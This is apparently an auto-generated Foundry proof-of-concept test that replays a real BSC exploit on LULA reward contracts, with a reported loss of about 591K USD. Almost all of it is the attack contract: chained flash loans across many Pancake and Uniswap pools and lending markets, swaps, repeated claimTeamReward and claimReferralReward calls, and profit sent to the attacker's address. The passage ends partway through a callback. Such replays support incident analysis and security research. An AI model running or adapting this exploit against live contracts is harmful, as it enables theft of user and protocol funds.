// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 591.06K USD
// Attacker : 0x2677806d48325ced7533c54b86ed5e99b129a4ed
// Attack Contract : 0x5e506ba06fa6c61d1069b0e68d7013de35afa816
// Vulnerable Contract : 0xf5d7029eb6751d170dcf0bb1c87af6f93d5a2e9a
// Attack Tx : 0xa219ab9d57e520e5235b15a8801f4ebac8cc45551be0430ce4e49caea0411d7c
// Block : 112655390
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 577.67K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 112655389;
    uint256 constant TX_TIMESTAMP = 1785254909;
    uint256 constant TX_BLOCK_NUMBER = 112655390;
    uint256 constant TX_VALUE = 10000000000;

    uint64 constant ATTACKER_EOA_TX_NONCE = 550;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
            vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(0);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 578295907588061000526778);
        _expectProfit(Addresses.attack_path_entry, attack, Addresses.aBnbWBNB, "aBnbWBNB", 9999999998);
        _expectProfit(Addresses.attack_path_entry, attack, Addresses.LULA, "LULA", 17930606610897076541785);
        _expectProfit(Addresses.attack_path_entry, attack, Addresses.variableDebtBnbUSDT, "variableDebtBnbUSDT", 2);
        economicOracles.push(
            EconomicOracle(Addresses.PoolManager, Addresses.ZERO, "BNB", "victim_loss", false, 80972823107725612, false)
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP, Addresses.USDT, "USDT", "victim_loss", false, 591659751036620107104457, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP, Addresses.LULA, "LULA", "victim_loss", false, 7997208894795931449638957, false
            )
        );
    }
}

contract OurAttack {
    // - omitted 3 additional pseudocode-backed attacker surface(s)

    function attack() public payable {
        _borrowFlash();
    }

    function flashCallback() internal {
        uint256 wbnbBalance = IERC20Like(Addresses.WBNB).balanceOf(Addresses.ERC1967Proxy_5D8C);
        uint256 approveFlowAllowance = 407751430795609694003729;
        IERC20Like(Addresses.WBNB).approve(Addresses.ERC1967Proxy_5D8C, approveFlowAllowance);
        bytes memory flashLoanProof = hex"01";
        IERC1967Proxy_5D8C(Addresses.ERC1967Proxy_5D8C)
            .flashLoan(Addresses.WBNB, 407751430795609694003729, flashLoanProof);
    }

    function flashCallback2() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_A9251C);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.vUSDT);
        IERC20Like(Addresses.WBNB)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC, 40000000000000000000000);
        uint256 supplyLiveAmount = 40000000000000000000000; // artifact amount preserved for Addresses.WBNB movement from address(this); replay-safe live balance cap/reserve disabled
        IInitializableImmutableAdminUpgradeabilityProxy_6807DC(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC
            ).supply(Addresses.WBNB, supplyLiveAmount, address(this), uint16(0));
        IInitializableImmutableAdminUpgradeabilityProxy_6807DC(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC
            ).borrow(Addresses.USDT, 14636621772420346946050423, 2, uint16(0), address(this));
        IERC20Like(Addresses.WBNB).approve(Addresses.vWBNB, 367751430795609694003729);
        IvWBNB(Addresses.vWBNB).mint(367751430795609694003729);
        IUnitroller(Addresses.Unitroller).enterMarkets(_addressArray1(Addresses.vWBNB));
        IvUSDT(Addresses.vUSDT).borrow(64955663379338748619443095);
        IVault_238A35(Addresses.Vault_238A35).lock(hex"");
        IERC20Like(Addresses.USDT).approve(Addresses.vUSDT, 64955663379338748619443095);
        IvUSDT(Addresses.vUSDT).repayBorrow(64955663379338748619443095);
        IUnitroller(Addresses.Unitroller).exitMarket(Addresses.vWBNB);
        IvWBNB(Addresses.vWBNB).redeemUnderlying(367751430795609694003729);
        IERC20Like(Addresses.USDT)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC, 14636621772420346946050423);
        uint256 initializableImmutableAdminUpgradeabilityProxy6807dcRepayAmount = 14636621772420346946050423; // pseudocode/artifact priority: value provenance: arg1=14636621772420346946050423 is covered by prior Addresses.USDT.balanceOf(address) return=14651273045465812758809233 with args (Addresses.InitializableImmutableAdminUpgradeabilityProxy_A9251C); do not cap to address(this)
        IInitializableImmutableAdminUpgradeabilityProxy_6807DC(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC
            ).repay(Addresses.USDT, initializableImmutableAdminUpgradeabilityProxy6807dcRepayAmount, 2, address(this));
        IInitializableImmutableAdminUpgradeabilityProxy_6807DC(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC
            ).withdraw(Addresses.WBNB, 39999999999990000000000, address(this));
    }

    function _borrowFlash() internal {
        uint256 depositAmount = address(this).balance; // natural replay: wrap only ETH currently held by this replay frame
        if (depositAmount > 10000000000) depositAmount = 10000000000;
        if (depositAmount != 0) IWBNB(Addresses.WBNB).deposit{value: depositAmount}();
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.ERC1967Proxy_5D8C);
        uint256 approveFlowAllowance = 4403307398128352291053180;
        IERC20Like(Addresses.USDT).approve(Addresses.ERC1967Proxy_5D8C, approveFlowAllowance);
        bytes memory flashLoanProof = hex"00";
        IERC1967Proxy_5D8C(Addresses.ERC1967Proxy_5D8C)
            .flashLoan(Addresses.USDT, 4403307398128352291053180, flashLoanProof);

        uint256 usdtBalanceOfAttackPathEntry = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, usdtBalanceOfAttackPathEntry);
    }

    function _unlockCallback() internal {
        uint256 usdtBalanceOfPoolManager = IERC20Like(Addresses.USDT).balanceOf(Addresses.PoolManager);
        IPoolManager(Addresses.PoolManager).take(Addresses.USDT, address(this), usdtBalanceOfPoolManager);
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_3121);
        IFlashToken0Like(Addresses.PancakeV3Pool_3121).token0();
        bytes memory pancakeV3Pool3121FlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa816000000000000000000000000000000000000000000182f2066161d29cedf1908000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000182f2066161d29cedf1908"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0031 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool pancakeV3Pool3121FlashCallSucceeded,) =
            Addresses.PancakeV3Pool_3121.call(bytes.concat(bytes4(0x490e6cbc), pancakeV3Pool3121FlashCallArgs));
        require(pancakeV3Pool3121FlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        IPoolManager(Addresses.PoolManager).sync(Addresses.USDT);
        IERC20Like(Addresses.USDT).transfer(Addresses.PoolManager, usdtBalanceOfPoolManager);
        IPoolManager(Addresses.PoolManager).settle();
    }

    function flashCallback3() internal {
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.UniswapV3Pool_CA9C);
        IFlashToken0Like(Addresses.UniswapV3Pool_CA9C).token0();
        bytes memory uniswapV3PoolCa9cFlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa8160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019d263f4e89cab28c300000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000019d263f4e89cab28c3"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0038 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool uniswapV3PoolCa9cFlashCallSucceeded,) =
            Addresses.UniswapV3Pool_CA9C.call(bytes.concat(bytes4(0x490e6cbc), uniswapV3PoolCa9cFlashCallArgs));
        require(uniswapV3PoolCa9cFlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 transferLiveAmount = 15007500000000000000000000; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_40EB, transferLiveAmount);
    }

    function flashCallback4() internal {
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_2CCE);
        IFlashToken0Like(Addresses.PancakeV3Pool_2CCE).token0();
        bytes memory pancakeV3Pool2cceFlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa8160000000000000000000000000000000000000000000220e0eb4e9dfda80f0ddb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000220e0eb4e9dfda80f0ddb"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0043 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool pancakeV3Pool2cceFlashCallSucceeded,) =
            Addresses.PancakeV3Pool_2CCE.call(bytes.concat(bytes4(0x490e6cbc), pancakeV3Pool2cceFlashCallArgs));
        require(pancakeV3Pool2cceFlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 transferLiveAmount = 4352126936468901521025364; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_3196, transferLiveAmount);
    }

    function flashCallback5() internal {
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_3196);
        IFlashToken0Like(Addresses.PancakeV3Pool_3196).token0();
        bytes memory pancakeV3Pool3196FlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa816000000000000000000000000000000000000000000039981aef39519ed670328000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000039981aef39519ed670328"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0048 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool pancakeV3Pool3196FlashCallSucceeded,) =
            Addresses.PancakeV3Pool_3196.call(bytes.concat(bytes4(0x490e6cbc), pancakeV3Pool3196FlashCallArgs));
        require(pancakeV3Pool3196FlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 transferLiveAmount = 4924249371693818379800005; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, transferLiveAmount);
    }

    function flashCallback6() internal {
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_7057);
        IFlashToken0Like(Addresses.PancakeV3Pool_7057).token0();
        bytes memory pancakeV3Pool7057FlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa816000000000000000000000000000000000000000000000ce0811aad68071553d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000ce0811aad68071553d0"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0053 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool pancakeV3Pool7057FlashCallSucceeded,) =
            Addresses.PancakeV3Pool_7057.call(bytes.concat(bytes4(0x490e6cbc), pancakeV3Pool7057FlashCallArgs));
        require(pancakeV3Pool7057FlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 transferLiveAmount = 2573373704656259499934747; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_2CCE, transferLiveAmount);
    }

    function flashCallback7() internal {
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_EB0F);
        IFlashToken0Like(Addresses.PancakeV3Pool_EB0F).token0();
        bytes memory pancakeV3PoolEb0fFlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa81600000000000000000000000000000000000000000004cf344c1fc94b5fc0a9ce00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000004cf344c1fc94b5fc0a9ce"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0058 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool pancakeV3PoolEb0fFlashCallSucceeded,) =
            Addresses.PancakeV3Pool_EB0F.call(bytes.concat(bytes4(0x490e6cbc), pancakeV3PoolEb0fFlashCallArgs));
        require(pancakeV3PoolEb0fFlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 transferLiveAmount = 11644832494376057957889070; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_94E4, transferLiveAmount);
    }

    function flashCallback8() internal {
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_94E4);
        IFlashToken0Like(Addresses.PancakeV3Pool_94E4).token0();
        bytes memory pancakeV3Pool94e4FlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa81600000000000000000000000000000000000000000009a1a4839435227fb589d900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000009a1a4839435227fb589d9"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0063 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool pancakeV3Pool94e4FlashCallSucceeded,) =
            Addresses.PancakeV3Pool_94E4.call(bytes.concat(bytes4(0x490e6cbc), pancakeV3Pool94e4FlashCallArgs));
        require(pancakeV3Pool94e4FlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 transferLiveAmount = 29239692224210174525417776; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_3121, transferLiveAmount);
    }

    function flashCallback9() internal {
        uint256 usdtBalanceOfPancakeV3Pool = IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool);
        IFlashToken0Like(Addresses.PancakeV3Pool).token0();
        bytes memory pancakeV3PoolFlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa8160000000000000000000000000000000000000000000412a566cec221958419560000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000412a566cec22195841956"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0068 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool pancakeV3PoolFlashCallSucceeded,) =
            Addresses.PancakeV3Pool.call(bytes.concat(bytes4(0x490e6cbc), pancakeV3PoolFlashCallArgs));
        require(pancakeV3PoolFlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 transferLiveAmount = 5814779276214205737777507; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_EB0F, transferLiveAmount);
    }

    function flashCallback10() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_40EB);
        IFlashToken0Like(Addresses.PancakeV3Pool_40EB).token0();
        bytes memory pancakeV3Pool40ebFlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa8160000000000000000000000000000000000000000000c685fa11e01ec6f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000c685fa11e01ec6f000000"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0073 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool pancakeV3Pool40ebFlashCallSucceeded,) =
            Addresses.PancakeV3Pool_40EB.call(bytes.concat(bytes4(0x490e6cbc), pancakeV3Pool40ebFlashCallArgs));
        require(pancakeV3Pool40ebFlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 usdtTransferAmount = 60815852382729835277027; // pseudocode/artifact priority: value provenance: arg1=60815852382729835277027 is covered by prior Addresses.USDT.balanceOf(address) return=22010301698748385313932902 with args (Addresses.PancakeV3Pool_40EB); do not cap to address(this)
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_7057, usdtTransferAmount);
    }

    function _readAssetState() internal {
        uint256 usdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.Vault_238A35);
        IVault_238A35(Addresses.Vault_238A35).take(Addresses.USDT, address(this), usdtBalance);
        IPoolManager(Addresses.PoolManager).unlock(hex"");
        IVault_238A35(Addresses.Vault_238A35).sync(Addresses.USDT);
        IERC20Like(Addresses.USDT).transfer(Addresses.Vault_238A35, usdtBalance);
        IVault_238A35(Addresses.Vault_238A35).settle();
    }

    function flashCallback11() internal {
        uint256 usdtBalanceOfUniswapV3Pool = IERC20Like(Addresses.USDT).balanceOf(Addresses.UniswapV3Pool);
        IFlashToken0Like(Addresses.UniswapV3Pool).token0();
        bytes memory uniswapV3PoolFlashCallArgs =
            hex"0000000000000000000000005e506ba06fa6c61d1069b0e68d7013de35afa8160000000000000000000000000000000000000000000007305cd2b4e7fcf21a9e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000007305cd2b4e7fcf21a9e"; // observed calldata selector 0x490e6cbc split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0084 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool uniswapV3PoolFlashCallSucceeded,) =
            Addresses.UniswapV3Pool.call(bytes.concat(bytes4(0x490e6cbc), uniswapV3PoolFlashCallArgs));
        require(uniswapV3PoolFlashCallSucceeded, "observed raw calldata 0x490e6cbc failed");
        uint256 usdtTransferAmount = 476376464776485394314; // pseudocode/artifact priority: value provenance: arg1=476376464776485394314 is covered by prior Addresses.USDT.balanceOf(address) return=33948697702930647751326 with args (Addresses.UniswapV3Pool); do not cap to address(this)
        IERC20Like(Addresses.USDT).transfer(Addresses.UniswapV3Pool_CA9C, usdtTransferAmount);
    }

    function flashCallback12() internal {
        flashCallback13();
        flashCallback14();
        flashCallback15();
    }

    function flashCallback13() internal {
        IERC20Like(Addresses.LULA).transferFrom(Addresses.attacker_eoa, address(this), 5000000000000000000000);
        IERC20Like(Addresses.LULA).approve(Addresses.PancakeRouter, type(uint256).max);
        {
            uint256 swapAmountIn = 5000000000000000000000;
            if (swapAmountIn != 0) {
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn, 0, _addressArray2(Addresses.LULA, Addresses.USDT), address(this), 1785254909
                    );
            }
        }
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        {
            uint256 swapAmountIn = 197050771007708796610064795;
            if (swapAmountIn != 0) {
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.USDT, Addresses.LULA),
                        0x43721aBC1D19378C6160AbfdA6f1dd488EBBB5c9,
                        1785254909
                    );
            }
        }
        IClaimTeamRewardLike(0x2a6Cf8592D1CC22BEd916481bb745ccAf80aE6F1).claimTeamReward();
        {
            (bool ok,) = 0x2a6Cf8592D1CC22BEd916481bb745ccAf80aE6F1.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
            require(ok, "selector 0xfc82f81c failed");
        }
        IClaimTeamRewardLike(0xF60F0895301fdEF5f4795A8A6b57f5cb2A664E3c).claimTeamReward();
        {
            (bool ok,) = 0xF60F0895301fdEF5f4795A8A6b57f5cb2A664E3c.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
            require(ok, "selector 0xfc82f81c failed");
        }
        IClaimTeamRewardLike(0xFE2554A23b352dEC8A93aFD2DD463A453d8eE0CE).claimTeamReward();
        {
            (bool ok,) = 0xFE2554A23b352dEC8A93aFD2DD463A453d8eE0CE.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
            require(ok, "selector 0xfc82f81c failed");
        }
        IERC20Like(Addresses.LULA).balanceOf(Addresses.Cake_LP);
        IERC20Like(Addresses.LULA).balanceOf(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a);
        IClaimTeamRewardLike(0xfD7eaBd41D826ADBA28Ef982BcC75AB1C679E4FA).claimTeamReward();
        {
            (bool ok,) = 0xfD7eaBd41D826ADBA28Ef982BcC75AB1C679E4FA.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
            require(ok, "selector 0xfc82f81c failed");
        }
        IPendingReferralRewardLike(0x2a6Cf8592D1CC22BEd916481bb745ccAf80aE6F1).pendingReferralReward();
        IERC20Like(Addresses.LULA).balanceOf(Addresses.Cake_LP);
    }

    function flashCallback14() internal {
        IERC20Like(Addresses.LULA).balanceOf(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a);
        IClaimReferralRewardLike(0x2a6Cf8592D1CC22BEd916481bb745ccAf80aE6F1).claimReferralReward();
        {
            (bool ok,) = 0x2a6Cf8592D1CC22BEd916481bb745ccAf80aE6F1.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
            require(ok, "selector 0xfc82f81c failed");
        }
        IPendingReferralRewardLike(0xF60F0895301fdEF5f4795A8A6b57f5cb2A664E3c).pendingReferralReward();
        IERC20Like(Addresses.LULA).balanceOf(Addresses.Cake_LP);
        IERC20Like(Addresses.LULA).balanceOf(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a);
        IClaimReferralRewardLike(0xF60F0895301fdEF5f4795A8A6b57f5cb2A664E3c).claimReferralReward();
        {
            (bool ok,) = 0xF60F0895301fdEF5f4795A8A6b57f5cb2A664E3c.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
            require(ok, "selector 0xfc82f81c failed");
        }
        IPendingReferralRewardLike(0xFE2554A23b352dEC8A93aFD2DD463A453d8eE0CE).pendingReferralReward();
        IERC20Like(Addresses.LULA).balanceOf(Addresses.Cake_LP);
        IERC20Like(Addresses.LULA).balanceOf(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a);
        IClaimReferralRewardLike(0xFE2554A23b352dEC8A93aFD2DD463A453d8eE0CE).claimReferralReward();
        {
            (bool ok,) = 0xFE2554A23b352dEC8A93aFD2DD463A453d8eE0CE.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
            require(ok, "selector 0xfc82f81c failed");
        }
        IPendingReferralRewardLike(0xfD7eaBd41D826ADBA28Ef982BcC75AB1C679E4FA).pendingReferralReward();
        IERC20Like(Addresses.LULA).balanceOf(Addresses.Cake_LP);
        IERC20Like(Addresses.LULA).balanceOf(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a);
        uint256 lulaTransferAmount = 392634225895698522739; // pseudocode/artifact priority: value provenance: arg1=392634225895698522739 is covered by prior Addresses.LULA.balanceOf(address) return=711056278236747843683 with args (Addresses.Cake_LP); do not cap to address(this)
        IERC20Like(Addresses.LULA).transfer(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a, lulaTransferAmount);
        IClaimReferralRewardLike(0xfD7eaBd41D826ADBA28Ef982BcC75AB1C679E4FA).claimReferralReward();
        {
            (bool ok,) = 0xfD7eaBd41D826ADBA28Ef982BcC75AB1C679E4FA.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
            require(ok, "selector 0xfc82f81c failed");
        }
        IPendingReferralRewardLike(0x6222155a9010Ec62dDe38e8E1606c7Bcd4Ce5897).pendingReferralReward();
        IERC20Like(Addresses.LULA).balanceOf(Addresses.Cake_LP);
        IERC20Like(Addresses.LULA).balanceOf(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a);
    }

    function flashCallback15() internal {
        uint256 lulaTransferAmount_2 = 285754430007355834460; // pseudocode/artifact priority: value provenance: arg1=285754430007355834460 is covered by prior Addresses.LULA.balanceOf(address) return=711056278236747843683 with args (Addresses.Cake_LP); do not cap to address(this)
        IERC20Like(Addresses.LULA).transfer(0x377a015f44C3FDf71060e94648EDC9e0316C7f1a, lulaTransferAmount_2);
        IClaimReferralRewardLike(0x6222155a9010Ec62dDe38e8E1606c7Bcd4Ce5897).claimReferralReward();
        (bool ok,) = 0x6222155a9010Ec62dDe38e8E1606c7Bcd4Ce5897.call(abi.encodeWithSelector(bytes4(0xfc82f81c)));
        require(ok, "selector 0xfc82f81c failed");
        IERC20Like(Addresses.LULA).approve(Addresses.PancakeRouter, type(uint256).max);
        uint256 swapAmountIn = 4999000000000000000000;
        if (swapAmountIn != 0) {
            IPancakeRouter(Addresses.PancakeRouter)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    swapAmountIn, 0, _addressArray2(Addresses.LULA, Addresses.USDT), address(this), 1785254909
                );
        }
        uint256 transferLiveAmount = 33952092572700940816102; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
        IERC20Like(Addresses.USDT).transfer(Addresses.UniswapV3Pool, transferLiveAmount);
    }

    receive() external payable {}

    function onMoolahFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        uint256 dispatchArg0FlashCallback;
        assembly { dispatchArg0FlashCallback := calldataload(4) }
        if (dispatchArg0FlashCallback == 4403307398128352291053180) {
            if (!_replayActive[REPLAY_CALLBACK_1]) {
                _replayActive[REPLAY_CALLBACK_1] = true;
                flashCallback();
                _replayActive[REPLAY_CALLBACK_1] = false;
            }
            return;
        }
        uint256 dispatchArg0FlashCallback2;
        assembly { dispatchArg0FlashCallback2 := calldataload(4) }
        if (dispatchArg0FlashCallback2 == 407751430795609694003729) {
            if (!_replayActive[REPLAY_CALLBACK_2]) {
                _replayActive[REPLAY_CALLBACK_2] = true;
                flashCallback2();
                _replayActive[REPLAY_CALLBACK_2] = false;
            }
            return;
        }
        if (!_replayActive[REPLAY_CALLBACK_1]) {
            _replayActive[REPLAY_CALLBACK_1] = true;
            flashCallback();
            _replayActive[REPLAY_CALLBACK_1] = false;
        }
        return;
    }

    function unlockCallback(bytes calldata arg0) external payable {
        if (!_replayActive[REPLAY_CALLBACK_4]) {
            _replayActive[REPLAY_CALLBACK_4] = true;
            _unlockCallback();
            _replayActive[REPLAY_CALLBACK_4] = false;
        }
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        if (msg.sender == 0x92b7807bF19b7DDdf89b706143896d05228f3121) {
            if (!_replayActive[REPLAY_CALLBACK_10]) {
                _replayActive[REPLAY_CALLBACK_10] = true;
                flashCallback8();
                _replayActive[REPLAY_CALLBACK_10] = false;
            }
            return;
        }
        if (msg.sender == 0xA0909f81785f87f3e79309F0E73A7d82208094E4) {
            if (!_replayActive[REPLAY_CALLBACK_9]) {
                _replayActive[REPLAY_CALLBACK_9] = true;
                flashCallback7();
                _replayActive[REPLAY_CALLBACK_9] = false;
            }
            return;
        }
